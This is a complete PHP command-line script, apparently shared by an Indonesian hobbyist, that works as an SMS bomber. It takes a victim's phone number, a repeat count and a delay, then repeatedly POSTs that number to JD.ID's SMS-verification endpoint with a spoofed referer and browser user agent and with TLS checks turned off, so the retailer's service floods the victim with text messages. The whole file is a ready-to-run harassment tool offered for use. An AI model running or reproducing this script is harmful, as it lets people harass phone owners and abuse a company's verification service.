<?php
function jdidbom($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=3");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
echo "
############################################################
    Spammer SMS From JD.ID
    Mod By      : CyberMrlinkerrorsystem
    Contact Me  : Mrlinkerrorsystem2015@gmail.com
    Blog        : https://mrlinkerrorsystem.blogspot.com
    Youtube     : berbagiilmudanakalsehat
    Instagram   : @cyber_mrlink_error_system_2019
    Thanks to   : THCA ERROR SYSTEM
    Penggunaan  : Awali Dengan Angka [8]
############################################################\n";
echo "\n \e[93m------------------\n Contoh 8××××××××××\n ------------------\n\n Nomor Target : ";
$nomor = trim(fgets(STDIN));
echo " Jumlah Paket : ";
$jumlah = trim(fgets(STDIN));
echo " Masukkan Jeda: ";
$jeda = trim(fgets(STDIN));
echo "\e[93m____________________________________________________________\n";
$execute = jdidbom($nomor, $jumlah, $jeda);
print $execute;
?>
